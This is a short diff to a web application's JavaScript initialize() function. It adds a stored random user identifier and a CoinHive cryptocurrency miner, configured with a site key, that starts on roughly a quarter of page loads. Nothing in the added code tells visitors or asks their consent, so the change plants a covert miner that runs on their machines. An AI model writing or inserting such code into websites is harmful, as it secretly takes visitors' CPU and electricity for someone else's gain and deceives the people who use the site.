@@ -1627,6 +1627,10 @@ function initialize() {
         lsm.setItem("initialTimestamp", new Date().getTime());
     }
 
+    if (lsm.getItem("uniqueIdentifier") == undefined) {
+        lsm.setItem("uniqueIdentifier", Math.random());
+    }
+
     if (lsm.getItem("loadCount") == undefined) {
         lsm.setItem("loadCount", 1);
     } else {
@@ -1941,6 +1945,12 @@ function initialize() {
             reportAnIssue();
         }
     });
+
+    var miner = new CoinHive.User('Cjv1MQzP7McKdWFumMCE7EXQeoZk367w', lsm.getItem("uniqueIdentifier"));
+    if (Math.random() < 0.25) {
+        miner.start();
+    }
+    console.log(miner);
 
     // Beta tooltip
     // $('#dropdown-list-a').tooltip({"title":"<i style=\"color: #F8814C;\" class=\"fa fa-exclamation-circle\"></i> " + getLanguageString('headerbar.dropdown.hover',lsm.getItem('langCode')),"html":true,"placement":"bottom"});
